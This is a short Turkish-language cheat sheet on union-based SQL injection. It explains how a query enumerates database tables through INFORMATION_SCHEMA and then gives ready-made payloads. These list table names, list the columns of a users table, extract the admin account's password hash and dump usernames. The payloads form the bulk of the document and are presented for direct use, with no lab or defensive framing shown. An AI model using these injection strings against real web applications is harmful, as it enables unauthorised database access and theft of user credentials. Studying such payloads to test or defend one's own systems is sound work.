# Union based sql inj

- `SELECT 1, table_name`: Veri tabanından neleri getirmek istediğini söyler. Buradaki `1` sayısı sadece yer tutucudur (orijinal sorgunun sütun sayısına eşitlemek için). `table_name` ise asıl hedef olan **tablo isimlerini** çekmek için kullanılır.

- `FROM INFORMATION_SCHEMA.COLUMNS` MySQL gibi veri tabanlarında, sistemdeki tüm tabloların ve sütunların listesini tutan gizli bir "sistem kütüphanesi" vardır. Kod, bilgileri bu hazır kütüphaneden ister. 

- `WHERE table_schema=DATABASE()` "Bana sadece şu an açık olan, bu web sitesinin kullandığı veri tabanına ait tabloları getir" filtresidir. Diğer sistem dosyalarını eleyerek hedefi daraltır.


**tablo isimlerini çekmek**

```bash
/" UNION SELECT 1, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE() -- 
```


**users tablosunun columnlarını çekmek**


```bash
/" UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='users'-- -
```

**admin kullanıcısının password hashini çekmek**

```bash
/" UNION SELECT 1,SUBSTRING((SELECT group_concat(password) FROM users WHERE username='admin'), 1, 16) -- -
```

**userleri çekmek**

```bash
/" UNION SELECT 1,`username` FROM users -- -
```